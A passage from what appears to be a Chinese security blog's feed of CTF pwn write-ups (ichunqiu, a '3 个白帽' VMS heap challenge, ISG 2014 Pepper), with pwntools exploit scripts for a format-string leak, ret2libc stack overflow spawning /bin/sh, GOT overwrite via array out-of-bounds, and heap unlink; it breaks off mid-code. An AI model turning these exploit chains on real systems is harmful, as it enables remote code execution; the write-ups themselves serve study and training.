class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;from sys import argv&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# io = process(&amp;quot;./cg_leak&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io = remote(&amp;quot;106.75.8.230&amp;quot;, 13349)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def leak(flag):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    name = &amp;quot;A&amp;quot; * 40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.recvuntil(&amp;quot;NAME:&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.sendline(name)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.recvuntil(&amp;quot;again?\n&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.sendline(name)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.recvuntil(&amp;quot;FLAG: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.sendline(flag)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.recvuntil(&amp;quot;Sorry AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    log.success(flag[:-1] + io.recv(1))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    io.close()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;leak(argv[1])&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-7.png&quot; alt=&quot;图 7&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;TIPS&quot;&gt;&lt;a href=&quot;#TIPS&quot; class=&quot;headerlink&quot; title=&quot;TIPS&quot;&gt;&lt;/a&gt;TIPS&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;格式化字符串中利用 “%7$n” 这种 format 很方便，意思是使用第 7 个参数：&lt;a href=&quot;http://www.freebuf.com/articles/system/74224.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;格式化字符串的漏洞利用（Part 1）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;第一次自己做 Pwn，真刺激。bin 和 idb：&lt;a href=&quot;/images/2016/07/04/ichunqiu.7z&quot;&gt;http://sh3ll.me/images/2016/07/04/ichunqiu.7z&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pwn1&quot;&gt;&lt;a href=&quot;#Pwn1&quot; class=&quot;headerlink&quot; title=&quot;Pwn1&quot;&gt;&lt;/a&gt;Pwn1&lt;/h2&gt;&lt;p&gt;在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-1.png&quot; alt=&quot;图 1&quot;&gt;
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>3 个白帽 - VMS</title>
    <link href="http://sh3ll.me/2016/06/28/baimao-vms/"/>
    <id>http://sh3ll.me/2016/06/28/baimao-vms/</id>
    <published>2016-06-28T08:29:41.000Z</published>
    <updated>2016-07-16T11:33:42.984Z</updated>
    
    <content type="html">&lt;p&gt;rss 里面落下好多文章没有看，看到这道题的时候已经过去了近一个月 :(。来来回回搞了一个星期，真是菜。&lt;/p&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;p&gt;程序相对简单，逆向中碰到的唯一略微难理解的地方可能就是堆指针的加密，这个在我以前做过的题目中是没有遇到过的。&lt;/p&gt;
&lt;h2 id=&quot;漏洞&quot;&gt;&lt;a href=&quot;#漏洞&quot; class=&quot;headerlink&quot; title=&quot;漏洞&quot;&gt;&lt;/a&gt;漏洞&lt;/h2&gt;&lt;h4 id=&quot;UAF&quot;&gt;&lt;a href=&quot;#UAF&quot; class=&quot;headerlink&quot; title=&quot;UAF&quot;&gt;&lt;/a&gt;UAF&lt;/h4&gt;&lt;p&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;这个 UAF 很容易就能看出来，程序在 Edit 漏洞信息时，没有判断漏洞是否在使用中，只是根据漏洞名称进行遍历，导致可以修改已经删除漏洞的 Rank、Detail。&lt;br&gt;&lt;img src=&quot;/images/2016/06/28/vms-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;信息泄露&quot;&gt;&lt;a href=&quot;#信息泄露&quot; class=&quot;headerlink&quot; title=&quot;信息泄露&quot;&gt;&lt;/a&gt;信息泄露&lt;/h4&gt;&lt;p&gt;程序中编写了函数 StdRead，为从 STDIN 中读到的数据后添加 “\x00”，导致没有办法通过 read 来进行信息泄露。但是程序中在 Add 和 Edit 时，如果 Rank 不大于 0，则不会去设置它。结合 fastbins 的特性，可以用来泄露堆地址。&lt;br&gt;&lt;img src=&quot;/images/2016/06/28/vms-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;br&gt;（这个点感觉真的很隐晦，我自己看的时候完全没有注意到，看了 Drops 中的 writeup 才了解到的，看来还是不够细心。）&lt;/p&gt;
&lt;h2 id=&quot;防护措施&quot;&gt;&lt;a href=&quot;#防护措施&quot; class=&quot;headerlink&quot; title=&quot;防护措施&quot;&gt;&lt;/a&gt;防护措施&lt;/h2&gt;&lt;p&gt;为了增大漏洞利用的难度，出题者开启了一些安全措施并自己编写了 Check 函数。&lt;/p&gt;
&lt;h4 id=&quot;FULL-RELRO&quot;&gt;&lt;a href=&quot;#FULL-RELRO&quot; class=&quot;headerlink&quot; title=&quot;FULL RELRO&quot;&gt;&lt;/a&gt;FULL RELRO&lt;/h4&gt;&lt;p&gt;checksec 可以看到程序开了 RELRO，以前没有接触过这个防护措施，Google 了下发现主要的影响是 got 表只读。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On current Linux, your binaries are often compiled with RELRO. So that mean that following sections are mapped as read-only:&lt;br&gt;.ctors .dtors .jcr .dynamic .got&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个 UAF 漏洞最后能达到的效果是任意地址写，如果 got 只读对利用会有很大影响。继续 Google，找到了两个绕过的方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fini()&lt;/li&gt;
&lt;li&gt;__free_hook()&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Drops 上的 writeup 也是利用的 __free_hook 这种方式。&lt;/p&gt;
&lt;h4 id=&quot;堆指针加密&quot;&gt;&lt;a href=&quot;#堆指针加密&quot; class=&quot;headerlink&quot; title=&quot;堆指针加密&quot;&gt;&lt;/a&gt;堆指针加密&lt;/h4&gt;&lt;p&gt;作者很“心机”，为了防止直接通过 UAF 修改 DetailAddr 指针，将堆地址异或后放入表/结构体中。如果想要修改指针就必须泄露出异或的 key。&lt;/p&gt;
&lt;h4 id=&quot;HeapPointerCheck&quot;&gt;&lt;a href=&quot;#HeapPointerCheck&quot; class=&quot;headerlink&quot; title=&quot;HeapPointerCheck&quot;&gt;&lt;/a&gt;HeapPointerCheck&lt;/h4&gt;&lt;p&gt;在 Add、Edit、Delete 功能中，程序会首先对堆地址进行 check。这个 check 最终我也没有绕过，看 writeup 上讲是因为 check 不严谨，多次尝试是有一定几率绕过的，糖果师傅也这样说。在 writeup 的评论中作者回复说可以通过将全局变量重写为无穷大进行绕过，但是我并没有想到办法去重写。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;h4 id=&quot;x64-下-fastbins-的大小限制是？&quot;&gt;&lt;a href=&quot;#x64-下-fastbins-的大小限制是？&quot; class=&quot;headerlink&quot; title=&quot;x64 下 fastbins 的大小限制是？&quot;&gt;&lt;/a&gt;x64 下 fastbins 的大小限制是？&lt;/h4&gt;&lt;p&gt;这道题目最开始时我完全没有想到 fastbin，因为 Vuln 的结构体是 104，按照市面上大部分文章所讲，fastbin 的大小限制应该是 16-64，它是不属于其中的。但是实际调试过程中发现这个大小是与系统位数有关的，x64 下相应的限制应该是 32-128。&lt;/p&gt;
&lt;h4 id=&quot;fastbins-真的不合并？&quot;&gt;&lt;a href=&quot;#fastbins-真的不合并？&quot; class=&quot;headerlink&quot; title=&quot;fastbins 真的不合并？&quot;&gt;&lt;/a&gt;fastbins 真的不合并？&lt;/h4&gt;&lt;p&gt;在写 exp 的过程中遇到了一个问题：泄露堆地址时如果先删除 Vuln0 再删除 Vuln1，会导致 fastbins 中的 chunk 合并，但是同样的在目前大家写的文章中都是说 fastbins 是不合并的。深究下发现了这篇文章：&lt;a href=&quot;http://blog.chinaunix.net/uid-27767798-id-4107020.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ptmalloc中的fastbin chunk的合并过程&lt;/a&gt; 解决了我的疑惑。这道题目中的情景是系统在 free 的 chunk 如果与 top chunk 相邻，那么当它与 top chunk 合并时系统回去尝试合并 fastbin 中的 chunk，减少碎片化。&lt;/p&gt;
&lt;h2 id=&quot;利用&quot;&gt;&lt;a href=&quot;#利用&quot; class=&quot;headerlink&quot; title=&quot;利用&quot;&gt;&lt;/a&gt;利用&lt;/h2&gt;&lt;p&gt;直接贴 EXP 出来吧，思路通了结合注释还是比较容易理解的：&lt;a href=&quot;https://gist.github.com/chuhades/73b1237c1429f384f980d7bb0328fa9c&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://gist.github.com/chuhades/73b1237c1429f384f980d7bb0328fa9c&lt;/a&gt;&lt;br&gt;其实基本与 Drops 上面是一样的 :D&lt;/p&gt;
&lt;h2 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://drops.wooyun.org/binary/16257&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;三个白帽-来 PWN 我一下好吗 writeup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The Art Of ELF: Analysis and Exploitations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://users.suse.com/~krahmer/relro.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;RELRO &amp;amp; ASLR &amp;amp; NX&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/wangaohui/p/5190889.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Malloc 碎碎念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.chinaunix.net/uid-27767798-id-4107020.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ptmalloc 中的 fastbin chunk 的合并过程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;rss 里面落下好多文章没有看，看到这道题的时候已经过去了近一个月 :(。来来回回搞了一个星期，真是菜。&lt;/p&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;p&gt;程序相对简单，逆向中碰到的唯一略微难理解的地方可能就是堆指针的加密，这个在我以前做过的题目中是没有遇到过的。&lt;/p&gt;
&lt;h2 id=&quot;漏洞&quot;&gt;&lt;a href=&quot;#漏洞&quot; class=&quot;headerlink&quot; title=&quot;漏洞&quot;&gt;&lt;/a&gt;漏洞&lt;/h2&gt;&lt;h4 id=&quot;UAF&quot;&gt;&lt;a href=&quot;#UAF&quot; class=&quot;headerlink&quot; title=&quot;UAF&quot;&gt;&lt;/a&gt;UAF&lt;/h4&gt;&lt;p&gt;
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>[Review]ISG 2014 Final Pepper</title>
    <link href="http://sh3ll.me/2016/05/15/review-pepper/"/>
    <id>http://sh3ll.me/2016/05/15/review-pepper/</id>
    <published>2016-05-15T09:12:45.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;ISG 2014 决赛上的一道题目，捡起来练练手。&lt;/p&gt;
&lt;h2 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title=&quot;逆向分析&quot;&gt;&lt;/a&gt;逆向分析&lt;/h2&gt;&lt;p&gt;逆向一直是我的弱点，经验不足，过度依赖 F5，总体感觉还是汇编能力太弱了 ：（&lt;br&gt;我的 idb 文件在这里：&lt;a href=&quot;/images/2016/05/15/pepper.idb&quot;&gt;点击下载&lt;/a&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;31337（0x08048F67）-栈溢出&quot;&gt;&lt;a href=&quot;#31337（0x08048F67）-栈溢出&quot; class=&quot;headerlink&quot; title=&quot;31337（0x08048F67） 栈溢出&quot;&gt;&lt;/a&gt;31337（0x08048F67） 栈溢出&lt;/h2&gt;&lt;p&gt;Menu 中存在一隐藏选项，0x08048F67，实质是一个栈溢出的后门：&lt;br&gt;&lt;img src=&quot;/images/2016/05/15/pepper-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;br&gt;系统开启 ASLR，但编译时未开启 PIC 选项。首先需要泄露出 libc 地址：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#!/usr/bin/env python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# -*- coding:utf-8 -*-&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# context.log_level = &amp;quot;DEBUG&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn = process(&amp;quot;/home/vagrant/pepper&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# conn = remote(&amp;quot;127.0.0.1&amp;quot;, 2333)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elf = ELF(&amp;quot;/home/vagrant/pepper&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;libc = ELF(&amp;quot;/lib/i386-linux-gnu/libc-2.19.so&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def get_advice(advice):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    conn.recvuntil(&amp;quot;Your choice: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    conn.sendline(&amp;quot;31337&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    conn.recvuntil(&amp;quot;Leave your message: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    conn.sendline(advice)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# leak libc base&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;puts_plt = elf.plt.get(&amp;quot;puts&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;get_advice_addr = 0x08048F67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;atoi_got = elf.got.get(&amp;quot;atoi&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.info(&amp;quot;puts@plt: &amp;#123;&amp;#125;&amp;quot;.format(hex(puts_plt)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.info(&amp;quot;get_advice_addr: &amp;#123;&amp;#125;&amp;quot;.format(hex(get_advice_addr)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.info(&amp;quot;atoi@got: &amp;#123;&amp;#125;&amp;quot;.format(hex(atoi_got)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;get_advice(&amp;quot;A&amp;quot; * 112 + pack(puts_plt) + pack(get_advice_addr) + pack(atoi_got))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.recvuntil(&amp;quot;We got that. Thanks.\n&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;libc_base = unpack(conn.recv(4)) - libc.symbols.get(&amp;quot;atoi&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;libc.address += libc_base&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# libc_gets = libc.symbols.get(&amp;quot;gets&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;libc_system = libc.symbols.get(&amp;quot;system&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;libc base: &amp;#123;&amp;#125;&amp;quot;.format(hex(libc_base)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# log.success(&amp;quot;libc gets: &amp;#123;&amp;#125;&amp;quot;.format(hex(libc_gets)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;system@libc: &amp;#123;&amp;#125;&amp;quot;.format(hex(libc_system)))&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后覆盖 ret 为 system 就可以了，这里利用了杨坤@Blue-Lotus 在《掘金 CTF》中提到的一个 TIP，直接在 libc.so 中查找 &lt;code&gt;/bin/sh&lt;/code&gt; 字符串：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;# exploit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.recvuntil(&amp;quot;Leave your message: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.sendline(&amp;quot;A&amp;quot; * 112 + pack(libc_system) + &amp;quot;AAAA&amp;quot; + pack(libc_base + 0x00160A24))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.recvline()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;conn.interactive()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;糖果师傅说比赛中选手很有可能修改掉这些字符串，所以还是自己输入靠谱些；）&lt;/p&gt;
&lt;h2 id=&quot;EditRestaurant（0x08048C63）-数组越界&quot;&gt;&lt;a href=&quot;#EditRestaurant（0x08048C63）-数组越界&quot; class=&quot;headerlink&quot; title=&quot;EditRestaurant（0x08048C63） 数组越界&quot;&gt;&lt;/a&gt;EditRestaurant（0x08048C63） 数组越界&lt;/h2&gt;&lt;p&gt;程序内多处存在数组越界的问题，在这个函数中可以通过伪造结构，利用数组越界做任意地址写：&lt;br&gt;&lt;img src=&quot;/images/2016/05/15/pepper-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;# add a restaurant to fake&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;padding = &amp;quot;A&amp;quot; * 0x24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fake_restaurant = p32(0x1) + p32(0x1) + p32(pepper.got.get(&amp;quot;atoi&amp;quot;)) + &amp;quot;A&amp;quot; * 0x20 + p32(0x1) + p32(0x0804B0A0)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;add_restaurant(&amp;quot;xxoo&amp;quot;, padding + fake_restaurant, 1, &amp;quot;xxoo&amp;quot;, 1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# information leak&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;show_details_of_restaurant(101)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;Recommended Dish: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;libc.address = u32(io.recv(4)) - libc.symbols.get(&amp;quot;atoi&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;libc base =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(libc.address)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;system addr =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(libc.symbols.get(&amp;quot;system&amp;quot;))))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# set atoi@got to system@symbols&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;edit_restaurant(101, 1, pack(libc.symbols.get(&amp;quot;system&amp;quot;)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# getshell&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;Your choice: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(&amp;quot;/bin/sh\x00&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;Your choice: &amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.interactive()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;EditRestaurant（0x08048C63）-堆溢出&quot;&gt;&lt;a href=&quot;#EditRestaurant（0x08048C63）-堆溢出&quot; class=&quot;headerlink&quot; title=&quot;EditRestaurant（0x08048C63） 堆溢出&quot;&gt;&lt;/a&gt;EditRestaurant（0x08048C63） 堆溢出&lt;/h2&gt;&lt;p&gt;同样是这个函数中，在修改 Description 未进行长度校验，导致堆溢出。&lt;br&gt;&lt;img src=&quot;/images/2016/05/15/pepper-3.png&quot; alt=&quot;图 3&quot;&gt;&lt;br&gt;利用方式是先申请 3 个 restaurant，通过修改 restaurant 0 的 Description 溢出 restaurant 1 和 restaurant 2 的 Description，伪造 chunk；删除 restaurant 2，程序去 free restaurant2’s description，进而 unlink 伪造的 chunk，double free；再次编辑 restaurant 1 可以修改 restaurant 的 Description Addr 至任意地址；再一次编辑时实现任意地址写。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div 